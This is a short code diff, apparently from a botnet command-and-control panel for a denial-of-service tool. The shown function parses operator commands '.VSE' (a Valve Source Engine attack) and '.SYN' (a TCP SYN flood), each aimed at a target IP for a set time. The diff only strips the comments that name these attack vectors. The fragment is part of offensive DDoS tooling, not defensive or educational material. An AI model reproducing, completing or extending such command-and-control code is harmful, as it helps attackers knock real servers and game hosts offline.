@@ -125,7 +125,6 @@ def command_line(client):
                 time.sleep(1)
                 break
 
-            # Valve Source Engine Attack Vector
             elif prefix == '.VSE':
                 if len(args) == 3:
                     ip = args[1]
@@ -140,8 +139,7 @@ def command_line(client):
                         send(client, Fore.RED + 'Invalid IP-address')
                 else:
                     send(client, 'Usage: .vse [IP] [TIME]')
-
-            # TCP SYN attack vector
+                                 
             elif prefix == '.SYN':
                 if len(args) == 3:
                     ip = args[1]
